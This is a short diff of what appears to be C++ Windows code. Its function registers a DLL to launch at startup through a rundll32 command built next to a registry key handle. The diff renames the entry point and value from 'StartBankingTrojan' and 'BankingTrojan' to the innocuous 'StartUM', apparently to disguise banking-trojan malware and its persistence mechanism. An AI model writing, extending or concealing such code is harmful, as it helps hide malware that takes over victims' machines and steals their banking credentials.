@@ -3,8 +3,8 @@
 
 void AddDllToStartup(char* dll) {
     std::string dllPath = dll;
-    std::string functionName = "StartBankingTrojan";
-    std::string value = "BankingTrojan";
+    std::string functionName = "StartUM";
+    std::string value = "StartUM";
     std::string command = "rundll32.exe " + dllPath + "," + functionName;
 
     HKEY hKey;
